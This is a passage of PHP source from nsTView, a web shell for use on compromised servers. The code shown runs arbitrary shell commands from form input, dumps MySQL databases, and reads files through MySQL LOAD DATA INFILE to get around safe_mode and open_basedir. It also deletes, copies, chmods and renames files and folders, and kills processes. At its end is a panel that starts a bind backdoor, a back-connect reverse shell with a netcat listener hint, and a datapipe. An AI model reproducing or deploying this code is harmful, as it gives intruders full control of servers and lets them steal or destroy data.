if(!is_writable($f_d)){die("&lt;br&gt;&lt;br&gt;&lt;font color=red&gt;This folder $f_d isnt writable!&lt;br&gt;Cannot make dump.&lt;br&gt;&lt;br&gt;
&lt;font color=green&gt;&lt;b&gt;You can change temp folder for dump file in your browser!&lt;br&gt;
&lt;font color=red&gt;Change variable &f_d=(here writable directory, expl: /tmp or c:/windows/temp)&lt;/font&gt;&lt;br&gt;
Then press enter&lt;/b&gt;&lt;/font&gt;
&lt;/font&gt;");}
mysql_select_db($db) or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
$fp = fopen($f_d."/".$f,"w");
fwrite($fp, "# nsTView.php v$ver
# Web: http://nst.void.ru
# Dump from: ".$_SERVER["SERVER_NAME"]." (".$_SERVER["SERVER_ADDR"].")
# MySQL version: ".mysql_get_server_info()."
# PHP version: ".phpversion()."
# Date: ".date("d.m.Y - H:i:s")."
# Dump db ( $db ) Table ( $tbl )
# --- eof ---

");
$que = mysql_query("SHOW CREATE TABLE `$tbl`") or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
$row = mysql_fetch_row($que);
fwrite($fp, "DROP TABLE IF EXISTS `$tbl`;\r\n");
$row[1]=str_replace("\n","\r\n",$row[1]);
fwrite($fp, $row[1].";\r\n\r\n");
$que = mysql_query("SELECT * FROM `$tbl`");
if(mysql_num_rows($que)&gt;0){
while($row = mysql_fetch_assoc($que)){
$keys = join("`, `", array_keys($row));
$values = array_values($row);
foreach($values as $k=&gt;$v) {$values[$k] = adds2($v);}
$values = implode("', '", $values);
$sql = "INSERT INTO `$tbl`(`$keys`) VALUES ('".$values."');\r\n";
fwrite($fp, $sql);
}
}
fclose($fp);
print "&lt;meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&dump_download=1&f_d=$f_d/\"&gt;";
}#end of dump




# db dump
if($_GET['dump_db']){
$c=mysql_num_rows(mysql_list_tables($db));
if($c&gt;=1){
print "&lt;br&gt;&lt;br&gt;&nbsp;&nbsp;&nbsp;Dump database &lt;b&gt;$db&lt;/b&gt;";
}else{
print "&lt;br&gt;&lt;br&gt;&lt;font color=red&gt;Cannot dump database. No tables exists in &lt;b&gt;$db&lt;/b&gt; db.&lt;/font&gt;";
die;
}
if(sizeof($tabs)==0){
$res = mysql_query("SHOW TABLES FROM $db");
if(mysql_num_rows($res)&gt;0){
while($row=mysql_fetch_row($res)){
$tabs[] .= $row[0];
}
}
}
$fp = fopen($f_d."/".$f,"w");
fwrite($fp, "# nsTView.php v$ver
# Web: http://nst.void.ru
# Dump from: ".$_SERVER["SERVER_NAME"]." (".$_SERVER["SERVER_ADDR"].")
# MySQL version: ".mysql_get_server_info()."
# PHP version: ".phpversion()."
# Date: ".date("d.m.Y - H:i:s")."
# Dump db ( $db )
# --- eof ---

");
foreach($tabs as $tab) {
fwrite($fp,"DROP TABLE IF EXISTS `$tab`;\r\n");
$res = mysql_query("SHOW CREATE TABLE `$tab`");
$row = mysql_fetch_row($res);
$row[1]=str_replace("\n","\r\n",$row[1]);
fwrite($fp, $row[1].";\r\n\r\n");
$res = mysql_query("SELECT * FROM `$tab`");
if(mysql_num_rows($res)&gt;0){
while($row=mysql_fetch_assoc($res)){
$keys = join("`, `", array_keys($row));
$values = array_values($row);
foreach($values as $k=&gt;$v) {$values[$k] = adds2($v);}
$values = join("', '", $values);
$sql = "INSERT INTO `$tab`(`$keys`) VALUES ('$values');\r\n";
fwrite($fp, $sql);
}}
fwrite($fp, "\r\n\r\n\r\n");
}
fclose($fp);
print "&lt;meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&dump_download=1&f_d=$f_d/\"&gt;";
}#end of db dump






$vnutr=$_GET['vnutr'];
$tbl=$_GET['tbl'];
if($vnutr and !$_GET['ins_new_line']){
print "&lt;table cellpadding=0 cellspacing=1&gt;&lt;tr&gt;&lt;td&gt;";

mysql_select_db($db) or die(mysql_error());
$c=mysql_query ("SELECT COUNT(*) FROM $tbl");
$cfa=mysql_fetch_array($c);
mysql_free_result($c);
print "
Total: $cfa[0]
&lt;form&gt;
From: &lt;input name=from size=3 value=0&gt;
To: &lt;input name=to size=3 value='$cfa[0]'&gt;
&lt;input type=submit name=show value=Show&gt;
&lt;input type=hidden name=vnutr value=1&gt;
&lt;input type=hidden name=vn value='$vn'&gt;
&lt;input type=hidden name=db value='$db'&gt;
&lt;input type=hidden name=login value='$login'&gt;
&lt;input type=hidden name=pass value='$pass'&gt;
&lt;input type=hidden name=adress value='$adress'&gt;
&lt;input type=hidden name=conn value=1&gt;
&lt;input type=hidden name=baza value=1&gt;
&lt;input type=hidden name=p value=sql&gt;
&lt;input type=hidden name=tbl value='$tbl'&gt;
 [&lt;a href='$php_self?getdb=1&to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tbl'&gt;DOWNLOAD&lt;/a&gt;] [&lt;a href='$php_self?to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tbl&ins_new_line=1'&gt;INSERT&lt;/a&gt;] [&lt;a href='$php_self?to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tbl&dump=1&f_d=$d'&gt;DUMP&lt;/a&gt;]
&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
$vn=$_GET['vn'];
$from=$_GET['from'];
$to=$_GET['to'];
$from=$_GET['from'];
$to=$_GET['to'];
if(!isset($from)){$from=0;}
if(!isset($to)){$to=50;}
$query = "SELECT * FROM $vn LIMIT $from,$to";
$result = mysql_query($query);
$result1= mysql_query($query);
print $del_result;
print "&lt;table cellpadding=0 cellspacing=1 border=1&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;";
for ($i=0;$i&lt;mysql_num_fields($result);$i++){
$name=mysql_field_name($result,$i);
$type  = mysql_field_type($result, $i);
$len  = mysql_field_len($result, $i);
print "&lt;td bgcolor=#BCE0FF&gt; $name (&lt;b&gt;$type($len)&lt;/b&gt;)&lt;/td&gt;";
}
print "&lt;/tr&gt;&lt;pre&gt;";

while($mn = mysql_fetch_array($result, MYSQL_ASSOC)){
foreach($mn as $key=&gt;$inside){
$buffer1 .= "`$key`='".adds($inside)."' AND ";
$b1 .= "&lt;td&gt;".htmlspecialchars($inside, ENT_NOQUOTES)."&nbsp;&lt;/td&gt;";
}
$buffer1  = substr($buffer1, 0, strlen($buffer1)-5);
$buffer1  = base64_encode($buffer1);
print "&lt;td&gt;
&lt;form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$tbl&vnutr=1&baza=1&vn=$vn&db=$db'&gt;
&lt;input type=hidden name=delete_row value='$buffer1'&gt;
&lt;input type=submit value=Del onclick='return confirm(\"DELETE ?\")' style='border:1px; background-color:white;'&gt;
&lt;/form&gt;&lt;form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$tbl&baza=1&vn=$vn&db=$db'&gt;
&lt;input type=hidden name=edit_row value='$buffer1'&gt;
&lt;input type=submit value=Edit style='border:1px;background-color:green;'&gt;
&lt;/form&gt;
&lt;/td&gt;\r\n";
print $b1;
print "&lt;/tr&gt;";
unset($b1);
unset($buffer1);
}



mysql_free_result($result);
print "&lt;/table&gt;";
} #end vnutr
print "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
} # end $conn



####   end of sql
print "&lt;/tr&gt;&lt;/td&gt;&lt;/table&gt; &lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
print $copyr;
die;
}


@$p=$_GET['p'];
if(@$_GET['p']=="selfremover"){
        print "&lt;tr&gt;&lt;td&gt;";
print "&lt;font color=red face=verdana size=1&gt;Are you sure?&lt;br&gt;
&lt;a href='$php_self?p=yes'&gt;Yes&lt;/a&gt; | &lt;a href='$php_self?'&gt;No&lt;/a&gt;&lt;br&gt;
Remove: &lt;u&gt;";
$path=__FILE__;
print $path;
print " &lt;/u&gt;?&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
die;
}

if($p=="yes"){
$path=__FILE__;
@unlink($path);
$path=str_replace("\\","/",$path);
if(file_exists($path)){$hmm="NOT DELETED!!!";
print "&lt;tr&gt;&lt;td&gt;&lt;font color=red&gt;FILE $path NOT DELETED&lt;/td&gt;&lt;/tr&gt;";
}else{$hmm="DELETED";}
print "&lt;script&gt;alert('$path $hmm');&lt;/script&gt;";

}



if($os=="unix"){
function fastcmd(){
global $fast_commands;
$c_f=explode("\n",$fast_commands);
$c_f=count($c_f)-2;
print "
&lt;form method=post&gt;
Total commands: $c_f&lt;br&gt;
&lt;select name=sh3&gt;";

$c=substr_count($fast_commands," (nst) ");
for($i=0; $i&lt;=$c; $i++){
       $expl2=explode("\r\n",$fast_commands);
        $expl=explode(" (nst) ",$expl2[$i]);
        if(trim($expl[1])!=""){
        print "&lt;option value='".trim($expl[1])."'&gt;$expl[0]&lt;/option&gt;\r\n";
   }
}

print "&lt;/select&gt;&lt;br&gt;
&lt;input type=submit value=Exec&gt;
&lt;/form&gt;
";
}
}#end of os unix


if($os=="win"){
function fastcmd(){
global $fast_commands_win;
$c_f=explode("\n",$fast_commands_win);
$c_f=count($c_f)-2;
print "
&lt;form method=post&gt;
Total commands: $c_f&lt;br&gt;
&lt;select name=sh3&gt;";

$c=substr_count($fast_commands_win," (nst) ");
for($i=0; $i&lt;=$c; $i++){
       $expl2=explode("\r\n",$fast_commands_win);
        $expl=explode(" (nst) ",$expl2[$i]);
        if(trim($expl[1])!=""){
        print "&lt;option value='".trim($expl[1])."'&gt;$expl[0]&lt;/option&gt;\r\n";
   }
}

print "&lt;/select&gt;&lt;br&gt;
&lt;input type=submit value=Exec&gt;
&lt;/form&gt;
";
}
}#end of os win


echo "
&lt;tr&gt;&lt;td&gt;";
if(@$_GET['sh311']=="1"){echo "&lt;center&gt;cmd&lt;br&gt;pwd:
";
chdir($d);
echo getcwd()."&lt;br&gt;&lt;br&gt;
Fast cmd:&lt;br&gt;";
fastcmd();
if($os=="win"){$d=str_replace("/","\\\\",$d);}
print "
&lt;a href=\"javascript:cwd('$d ')\"&gt;Insert pwd&lt;/a&gt;
&lt;form name=sh311Form method=post&gt;&lt;input name=sh3 size=110&gt;&lt;/form&gt;&lt;/center&gt;&lt;br&gt;
";
if(@$_POST['sh3']){
$sh3=$_POST['sh3'];
echo "&lt;pre&gt;";
print `$sh3`;
echo "&lt;/pre&gt;";
}
}

if(@$_GET['sh311']=="2"){
echo "&lt;center&gt;cmd&lt;br&gt;
pwd:
";
chdir($d);
echo getcwd()."&lt;br&gt;&lt;br&gt;
Fast cmd:&lt;br&gt;";
fastcmd();
if($os=="win"){$d=str_replace("/","\\\\",$d);}
print "
&lt;a href=\"javascript:cwd('$d ')\"&gt;Insert pwd&lt;/a&gt;
&lt;form name=sh311Form method=post&gt;&lt;input name=sh3 size=110&gt;&lt;/form&gt;&lt;/center&gt;&lt;br&gt;";
if(@$_POST['sh3']){
$sh3=$_POST['sh3'];
echo "&lt;pre&gt;"; print `$sh3`; echo "&lt;/pre&gt;";}
echo $copyr;
exit;}

if(@$_GET['delfl']){
@$delfolder=$_GET['delfolder'];
echo "DELETE FOLDER: &lt;font color=red&gt;".@$_GET['delfolder']."&lt;/font&gt;&lt;br&gt;
(All files must be writable)&lt;br&gt;
&lt;a href='$php_self?deldir=1&dir=".@$delfolder."&rback=".@$_GET['rback']."'&gt;Yes&lt;/a&gt; || &lt;a href='$php_self?d=$d'&gt;No&lt;/a&gt;&lt;br&gt;&lt;br&gt;
";
echo $copyr;
exit;
}


$mkdir=$_GET['mkdir'];
if($mkdir){
print "&lt;br&gt;&lt;b&gt;Create Folder in $d :&lt;/b&gt;&lt;br&gt;&lt;br&gt;
&lt;form method=post&gt;
New folder name:&lt;br&gt;
&lt;input name=dir_n size=30&gt;
&lt;/form&gt;&lt;br&gt;
";
if($_POST['dir_n']){
mkdir($d."/".$_POST['dir_n']) or die('Cannot create directory '.$_POST['dir_n']);
print "&lt;b&gt;&lt;font color=green&gt;Directory created success!&lt;/font&gt;&lt;/b&gt;";
}
print $copyr;
die;
}


$mkfile=$_GET['mkfile'];
if($mkfile){
print "&lt;br&gt;&lt;b&gt;Create file in $d :&lt;/b&gt;&lt;br&gt;&lt;br&gt;
&lt;form method=post&gt;
File name:&lt;br&gt;
(example: hello.txt , hello.php)&lt;br&gt;
&lt;input name=file_n size=30&gt;
&lt;/form&gt;&lt;br&gt;
";
if($_POST['file_n']){
$fp=fopen($d."/".$_POST['file_n'],"w") or die('Cannot create file '.$_POST['file_n']);
fwrite($fp,"");
print "&lt;b&gt;&lt;font color=green&gt;File created success!&lt;/font&gt;&lt;/b&gt;";
}
print $copyr;
die;
}


$ps_table=$_GET['ps_table'];
if($ps_table){

if($_POST['kill_p']){
exec("kill -9 ".$_POST['kill_p']);
}

$str=`ps aux`;

# You can put here preg_match_all for other distrib/os
preg_match_all("/(?:.*?)([0-9]{1,7})(.*?)\s\s\s[0-9]:[0-9][0-9]\s(.*)/i",$str,$matches);


print "&lt;br&gt;&lt;b&gt;PS Table :: Fast kill program&lt;br&gt;
(p.s: Tested on Linux slackware 10.0)&lt;br&gt;
&lt;br&gt;&lt;/b&gt;";
print "&lt;center&gt;&lt;table border=1&gt;";
for($i=0; $i&lt;count($matches[3]); $i++){
$expl=explode(" ",$matches[0][$i]);
print "&lt;tr&gt;&lt;td&gt;$expl[0]&lt;/td&gt;&lt;td&gt;PID: ".$matches[1][$i]." :: ".$matches[3][$i]."&lt;/td&gt;&lt;form method=post&gt;&lt;td&gt;&lt;font color=red&gt;Kill: &lt;input type=submit name=kill_p value=".trim($matches[1][$i])."&gt;&lt;/td&gt;&lt;/form&gt;&lt;/tr&gt;";
}#end of for
print "&lt;/table&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;";
unset($str);
print $copyr;
die;
}#end of ps table


$read_file_safe_mode=$_GET['read_file_safe_mode'];
if($read_file_safe_mode){

if(!isset($_POST['l'])){$_POST['l']="root";}

print "&lt;br&gt;
Read file content using MySQL - when &lt;b&gt;safe_mode&lt;/b&gt;, &lt;b&gt;open_basedir&lt;/b&gt; is &lt;font color=green&gt;ON&lt;/font&gt;&lt;Br&gt;
&lt;form method=post&gt;
&lt;table&gt;
&lt;tr&gt;&lt;td&gt;Addr:&lt;/td&gt;&lt;Td&gt; &lt;input name=serv_ip value='127.0.0.1'&gt;&lt;input name=port value='3306' size=6&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;Login:&lt;/td&gt;&lt;td&gt;&lt;input name=l value=".$_POST['l']."&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;Passw:&lt;/td&gt;&lt;td&gt;&lt;input name=p value=".$_POST['p']."&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
(example: /etc/hosts)&lt;br&gt;
&lt;input name=read_file size=45&gt;&lt;br&gt;
&lt;input type=submit value='Show content'&gt;
&lt;/form&gt;
&lt;br&gt;";

if($_POST['read_file']){
$read_file=$_POST['read_file'];
@mysql_connect($_POST['serv_ip'].":".$_POST['port'],$_POST['l'],$_POST['p']) or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
mysql_create_db("tmp_bd_file") or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
mysql_select_db("tmp_bd_file") or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
mysql_query('CREATE TABLE `tmp_file` ( `file` LONGBLOB NOT NULL );') or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
mysql_query("LOAD DATA INFILE \"".addslashes($read_file)."\" INTO TABLE tmp_file");
$query = "SELECT * FROM tmp_file";
$result = mysql_query($query) or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
print "&lt;b&gt;File content&lt;/b&gt;:&lt;br&gt;&lt;br&gt;";
for($i=0;$i&lt;mysql_num_fields($result);$i++){
$name=mysql_field_name($result,$i);}
while($line=mysql_fetch_array($result, MYSQL_ASSOC)){
foreach ($line as $key =&gt;$col_value) {
print htmlspecialchars($col_value)."&lt;br&gt;";}}
mysql_free_result($result);
mysql_drop_db("tmp_bd_file") or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
}


print $copyr;
die;
}#end of read_file_safe_mode


# sys
$wich_f=$_GET['wich_f'];
$delete=$_GET['delete'];
$del_f=$_GET['del_f'];
$chmod=$_GET['chmod'];
$ccopy_to=$_GET['ccopy_to'];


# delete
if(@$_GET['del_f']){
if(!isset($delete)){
print "&lt;font color=red&gt;Delete this file?&lt;/font&gt;&lt;br&gt;
&lt;b&gt;$d/$wich_f&lt;br&gt;&lt;br&gt;&lt;/b&gt;
&lt;a href='$php_self?d=$d&del_f=$wich_f&delete=1'&gt;Yes&lt;/a&gt; / &lt;a href='$php_self?d=$d'&gt;No&lt;/a&gt;
";}
if($delete==1){
unlink($d."/".$del_f);
print "&lt;b&gt;File: &lt;font color=green&gt;$d/$del_f DELETED!&lt;/font&gt;&lt;/b&gt;
&lt;br&gt;&lt;b&gt; &lt;a href='$php_self?d=$d'&gt;# BACK&lt;/a&gt;
";
}
echo $copyr;
exit;
}


# copy to
if($ccopy_to){
$wich_f=$_POST['wich_f'];
$to_f=$_POST['to_f'];
print "&lt;font color=green&gt;Copy file:&lt;br&gt;
$d/$ccopy_to&lt;/font&gt;&lt;br&gt;
&lt;br&gt;
&lt;form method=post&gt;
File:&lt;br&gt;&lt;input name=wich_f size=100 value='$d/$ccopy_to'&gt;&lt;br&gt;&lt;br&gt;
To:&lt;br&gt;&lt;input name=to_f size=100 value='$d/nst_$ccopy_to'&gt;&lt;br&gt;&lt;br&gt;
&lt;input type=submit value=Copy&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;
";

if($to_f){
@copy($wich_f,$to_f) or die("&lt;font color=red&gt;Cannot copy!!! maybe folder is not writable&lt;/font&gt;");
print "&lt;font color=green&gt;&lt;b&gt;Copy success!!!&lt;/b&gt;&lt;/font&gt;&lt;br&gt;";
}

echo $copyr;
exit;
}


# chmod
if(@$_GET['chmod']){
$perms = @fileperms($d."/".$wich_f);
print "&lt;b&gt;&lt;font color=green&gt;CHMOD file $d/$wich_f&lt;/font&gt;&lt;br&gt;
&lt;br&gt;&lt;center&gt;This file chmod is&lt;/b&gt; ";
print perm($perms);
print "&lt;/center&gt;
&lt;br&gt;";
$chmd=&lt;&lt;&lt;HTML

&lt;script&gt;
&lt;!--

function do_chmod(user) {
        var field4 = user + "4";
        var field2 = user + "2";
        var field1 = user + "1";
        var total = "t_" + user;
        var symbolic = "sym_" + user;
        var number = 0;
        var sym_string = "";

        if (document.chmod[field4].checked == true) { number += 4; }
        if (document.chmod[field2].checked == true) { number += 2; }
        if (document.chmod[field1].checked == true) { number += 1; }

        if (document.chmod[field4].checked == true) {
                sym_string += "r";
        } else {
                sym_string += "-";
        }
        if (document.chmod[field2].checked == true) {
                sym_string += "w";
        } else {
                sym_string += "-";
        }
        if (document.chmod[field1].checked == true) {
                sym_string += "x";
        } else {
                sym_string += "-";
        }

        if (number == 0) { number = ""; }
        document.chmod[total].value = number;
        document.chmod[symbolic].value = sym_string;

        document.chmod.t_total.value = document.chmod.t_owner.value + document.chmod.t_group.value + document.chmod.t_other.value;
        document.chmod.sym_total.value = "-" + document.chmod.sym_owner.value + document.chmod.sym_group.value + document.chmod.sym_other.value;
}
//--&gt;
&lt;/script&gt;



&lt;form name="chmod" method=post&gt;
&lt;p&gt;&lt;table cellpadding="0" cellspacing="0" border="0" bgcolor="silver"&gt;&lt;tr&gt;&lt;td width="100%" valign="top"&gt;&lt;table width="100%" cellpadding="5" cellspacing="2" border="0"&gt;&lt;tr&gt;&lt;td width="100%" bgcolor="#008000" align="center" colspan="5"&gt;&lt;font color="#ffffff" size="3"&gt;&lt;b&gt;CHMOD (File Permissions)&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;
        &lt;tr bgcolor="gray"&gt;
                &lt;td align="left"&gt;&lt;b&gt;Permission&lt;/b&gt;&lt;/td&gt;
                &lt;td align="center"&gt;&lt;b&gt;Owner&lt;/b&gt;&lt;/td&gt;
                &lt;td align="center"&gt;&lt;b&gt;Group&lt;/b&gt;&lt;/td&gt;
                &lt;td align="center"&gt;&lt;b&gt;Other&lt;/b&gt;&lt;/td&gt;
                &lt;td bgcolor="#dddddd" rowspan="4"&gt; &lt;/td&gt;
        &lt;/tr&gt;&lt;tr bgcolor="#dddddd"&gt;
                &lt;td align="left" nowrap&gt;&lt;b&gt;Read&lt;/b&gt;&lt;/td&gt;
                &lt;td align="center" bgcolor="#ffffff"&gt;&lt;input type="checkbox" name="owner4" value="4" onclick="do_chmod('owner')"&gt;&lt;/td&gt;
                &lt;td align="center" bgcolor="#ffffff"&gt;&lt;input type="checkbox" name="group4" value="4" onclick="do_chmod('group')"&gt;&lt;/td&gt;
                &lt;td align="center" bgcolor="#ffffff"&gt;&lt;input type="checkbox" name="other4" value="4" onclick="do_chmod('other')"&gt;&lt;/td&gt;
        &lt;/tr&gt;&lt;tr bgcolor="#dddddd"&gt;
                &lt;td align="left" nowrap&gt;&lt;b&gt;Write&lt;/b&gt;&lt;/td&gt;
                &lt;td align="center" bgcolor="#ffffff"&gt;&lt;input type="checkbox" name="owner2" value="2" onclick="do_chmod('owner')"&gt;&lt;/td&gt;
                &lt;td align="center" bgcolor="#ffffff"&gt;&lt;input type="checkbox" name="group2" value="2" onclick="do_chmod('group')"&gt;&lt;/td&gt;
                &lt;td align="center" bgcolor="#ffffff"&gt;&lt;input type="checkbox" name="other2" value="2" onclick="do_chmod('other')"&gt;&lt;/td&gt;
        &lt;/tr&gt;&lt;tr bgcolor="#dddddd"&gt;
                &lt;td align="left" nowrap&gt;&lt;b&gt;Execute&lt;/b&gt;&lt;/td&gt;
                &lt;td align="center" bgcolor="#ffffff"&gt;&lt;input type="checkbox" name="owner1" value="1" onclick="do_chmod('owner')"&gt;&lt;/td&gt;
                &lt;td align="center" bgcolor="#ffffff"&gt;&lt;input type="checkbox" name="group1" value="1" onclick="do_chmod('group')"&gt;&lt;/td&gt;
                &lt;td align="center" bgcolor="#ffffff"&gt;&lt;input type="checkbox" name="other1" value="1" onclick="do_chmod('other')"&gt;&lt;/td&gt;
        &lt;/tr&gt;&lt;tr bgcolor="#dddddd"&gt;
                &lt;td align="right" nowrap&gt;Octal:&lt;/td&gt;
                &lt;td align="center"&gt;&lt;input type="text" name="t_owner" value="" size="1"&gt;&lt;/td&gt;
                &lt;td align="center"&gt;&lt;input type="text" name="t_group" value="" size="1"&gt;&lt;/td&gt;
                &lt;td align="center"&gt;&lt;input type="text" name="t_other" value="" size="1"&gt;&lt;/td&gt;
                &lt;td align="left"&gt;&lt;b&gt;=&lt;/b&gt; &lt;input type="text" name="t_total" value="777" size="3"&gt;&lt;/td&gt;
        &lt;/tr&gt;&lt;tr bgcolor="#dddddd"&gt;
                &lt;td align="right" nowrap&gt;Symbolic:&lt;/td&gt;
                &lt;td align="center"&gt;&lt;input type="text" name="sym_owner" value="" size="3"&gt;&lt;/td&gt;
                &lt;td align="center"&gt;&lt;input type="text" name="sym_group" value="" size="3"&gt;&lt;/td&gt;
                &lt;td align="center"&gt;&lt;input type="text" name="sym_other" value="" size="3"&gt;&lt;/td&gt;
                &lt;td align="left" width=100&gt;&lt;b&gt;=&lt;/b&gt; &lt;input type="text" name="sym_total" value="" size="10"&gt;&lt;/td&gt;
        &lt;/tr&gt;
&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;
HTML;

print "&lt;center&gt;".$chmd."

&lt;b&gt;$d/$wich_f&lt;/b&gt;&lt;br&gt;&lt;br&gt;
&lt;input type=submit value=CHMOD&gt;&lt;/form&gt;
&lt;/center&gt;
&lt;/form&gt;
";
$t_total=$_POST['t_total'];
if($t_total){
chmod($d."/".$wich_f,$t_total);
print "&lt;center&gt;&lt;font color=green&gt;&lt;br&gt;&lt;b&gt;Now chmod is $t_total&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;/font&gt;";
print "&lt;a href='$php_self?d=$d'&gt;# BACK&lt;/a&gt;&lt;br&gt;&lt;br&gt;";
}
echo $copyr;
exit;
}

# rename
if(@$_GET['rename']){
print "&lt;b&gt;&lt;font color=green&gt;RENAME $d/$wich_f ?&lt;/b&gt;&lt;/font&gt;&lt;br&gt;&lt;br&gt;
&lt;center&gt;
&lt;form method=post&gt;
&lt;b&gt;RENAME&lt;/b&gt;&lt;br&gt;&lt;u&gt;$wich_f&lt;/u&gt;&lt;br&gt;&lt;Br&gt;&lt;B&gt;TO&lt;/B&gt;&lt;br&gt;
&lt;input name=rto size=40 value='$wich_f'&gt;&lt;br&gt;&lt;br&gt;
&lt;input type=submit value=RENAME&gt;
&lt;/form&gt;
";

@$rto=$_POST['rto'];

if($rto){
$fr1=$d."/".$wich_f;
$fr1=str_replace("//","/",$fr1);
$to1=$d."/".$rto;
$to1=str_replace("//","/",$to1);

rename($fr1,$to1);
print "File &lt;br&gt;&lt;b&gt;$wich_f&lt;/b&gt;&lt;br&gt;Renamed to &lt;b&gt;$rto&lt;/b&gt;&lt;br&gt;&lt;br&gt;";

echo "&lt;meta http-equiv=\"REFRESH\" content=\"3;URL=".$php_self."?d=".$d."&rename=1&wich_f=".$rto."\"&gt;";

}

echo $copyr;
exit;
}




if(@$_GET['deldir']){
@$dir=$_GET['dir'];
function deldir($dir)
{
$handle = @opendir($dir);
while (false!==($ff = @readdir($handle))){
if($ff != "." && $ff != ".."){
if(@is_dir("$dir/$ff")){
deldir("$dir/$ff");
}else{
@unlink("$dir/$ff");
}}}
@closedir($handle);
if(@rmdir($dir)){
@$success = true;}
return @$success;
}
$dir=@$dir;
deldir($dir);

$rback=$_GET['rback'];
@$rback=explode("/",$rback);
$crb=count($rback);
for($i=0; $i&lt;$crb-1; $i++){
        @$x.=$rback[$i]."/";
}
echo "&lt;meta http-equiv=\"REFRESH\" content=\"0;URL='$php_self?d=".@$x."'\"&gt;";
echo $copyr;
exit;}


if(@$_GET['t']=="tools"){
        # unix
if($os=="unix"){
print "
&lt;center&gt;&lt;br&gt;
&lt;font color=red&gt;&lt;b&gt;P.S: After you Start, your browser may stuck! You must close it, and then run nstview.php again.&lt;/b&gt;&lt;br&gt;&lt;/font&gt;
&lt;table border=1&gt;
&lt;tr&gt;&lt;td align=center&gt;&lt;b&gt;[Name]&lt;/td&gt;&lt;td align=center&gt;&lt;b&gt;[C]&lt;/td&gt;&lt;td align=center&gt;&lt;b&gt;[Port]&lt;/td&gt;&lt;td align=center&gt;&lt;b&gt;[Perl]&lt;/td&gt;&lt;td align=center&gt;&lt;b&gt;[Port]&lt;/td&gt;&lt;td align=center&gt;&lt;b&gt;[Other options, info]&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;form method=post&gt;&lt;td&gt;&lt;font color=red&gt;&lt;b&gt;Backdoor:&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit name=c_bd value='Start' style='background-color:green;'&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port size=6 value=5545&gt;&lt;/td&gt;&lt;/form&gt;&lt;form method=post&gt;&lt;td&gt;&lt;input type=submit name=perl_bd value='Start' style='background-color:green;'&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port value=5551 size=6&gt;&lt;/td&gt;&lt;td&gt;none&lt;/td&gt;&lt;/form&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;form method=post&gt;&lt;td&gt;&lt;font color=red&gt;&lt;b&gt;Back connect:&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value='Start' name=bc_c style='background-color:green;'&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port_c size=6 value=5546&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value='Start' name=port_p disabled style='background-color:gray;'&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port value=5552 size=6&gt;&lt;/td&gt;&lt;td&gt;b.c. ip: &lt;input name=ip value='".$_SERVER['REMOTE_ADDR']."'&gt; nc -l -p &lt;i&gt;5546&lt;/i&gt;&lt;/td&gt;&lt;/form&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;form method=post&gt;&lt;td&gt;&lt;font color=red&gt;&lt;b&gt;Datapipe:&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value='Start' disabled style='background-color:gray;'&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port_1 size=6 value=5547&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value='Start' name=datapipe_pl style='background-color:green;'&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port_2 value=5553 size=6&gt;&lt;/td&gt;&lt;td&gt;other serv ip: &lt;input name=ip&gt; port: &lt;input name=port_3 value=5051 size=6&gt;&lt;/td&gt;&lt;/form&gt;&lt;/tr&gt;
